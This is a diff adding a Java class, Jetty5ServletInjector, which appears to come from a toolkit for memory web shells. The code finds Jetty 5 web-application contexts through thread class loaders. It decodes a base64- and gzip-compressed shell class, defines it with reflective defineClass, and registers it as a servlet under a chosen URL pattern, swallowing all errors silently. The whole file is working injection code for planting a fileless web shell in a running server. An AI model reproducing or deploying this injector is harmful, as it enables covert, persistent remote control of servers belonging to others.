@@ -1,0 +1,200 @@
+package org.leo.jmg.mem.injectortpl.jetty5;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashSet;
+import java.util.Set;
+import java.util.zip.GZIPInputStream;
+
+/**
+ * @author ReaJason
+ * @since 2026/7/4
+ */
+    public class Jetty5ServletInjector {
+
+    private static boolean ok;
+    private static String shellClassName;
+    private static String shellClass;
+    private static String urlPattern;
+
+    public Jetty5ServletInjector() {
+        if (ok) return;
+        try {
+            Set<Object> contexts = getContext();
+            if (contexts != null) {
+                for (Object context : contexts) {
+                    try {
+                        loadShell(context);
+                        inject(context);
+                    } catch (Throwable ignored) {
+                    }
+                }
+            }
+        } catch (Throwable ignored) {
+        } finally {
+            ok = true;
+            shellClass = null;
+            shellClassName = null;
+            urlPattern = null;
+        }
+    }
+
+    private void inject(Object context) throws Exception {
+        Object servletHandler = getWebApplicationHandler(context);
+
+        if (invokeMethod(servletHandler, "getServletHolder", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
+            return;
+        }
+
+        invokeMethod(
+                servletHandler,
+                "addServlet",
+                new Class[]{String.class, String.class, String.class},
+                new Object[]{shellClassName, urlPattern, shellClassName});
+    }
+
+    /**
+     * org.mortbay.jetty.servlet.WebApplicationContext
+     */
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
+            try {
+                Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");
+                String name = contextClassLoader.getClass().getName();
+                if (name.endsWith("ContextLoader")) {
+                    contexts.add(getFieldValue(contextClassLoader, "_context"));
+                }
+            } catch (Exception ignored) {
+            }
+        }
+        return contexts;
+    }
+
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader"));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "_classLoader"));
+        }
+    }
+
+    public Object getWebApplicationHandler(Object context) throws Exception {
+        try {
+            Object webApplicationHandler = invokeMethod(context, "getWebApplicationHandler");
+            if (webApplicationHandler != null) {
+                return webApplicationHandler;
+            }
+        } catch (Exception ignored) {
+        }
+        try {
+            Object webApplicationHandler = getFieldValue(context, "_webAppHandler");
+            if (webApplicationHandler != null) {
+                return webApplicationHandler;
+            }
+        } catch (Exception ignored) {
+        }
+        return getFieldValue(context, "_servletHandler");
+    }
+
+    @SuppressWarnings("all")
+    private void loadShell(Object context) throws Exception {
+        ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz;
+        try {
+            clazz = classLoader.loadClass(shellClassName);
+        } catch (Exception e) {
+            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+        }
+        clazz.newInstance();
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } finally {
+            if (gzipInputStream != null) {
+                gzipInputStream.close();
+            }
+            out.close();
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws Exception {
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                return field.get(obj);
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
+        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+        try {
+            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+            Method method = null;
+            while (clazz != null && method == null) {
+                try {
+                    if (paramClazz == null) {
+                        method = clazz.getDeclaredMethod(methodName);
+                    } else {
+                        method = clazz.getDeclaredMethod(methodName, paramClazz);
+                    }
+                } catch (NoSuchMethodException e) {
+                    clazz = clazz.getSuperclass();
+                }
+            }
+            if (method == null) {
+                throw new NoSuchMethodException("Method not found: " + methodName);
+            }
+            method.setAccessible(true);
+            return method.invoke(obj instanceof Class ? null : obj, param);
+        } catch (NoSuchMethodException e) {
+            throw e;
+        } catch (Exception e) {
+            throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+}
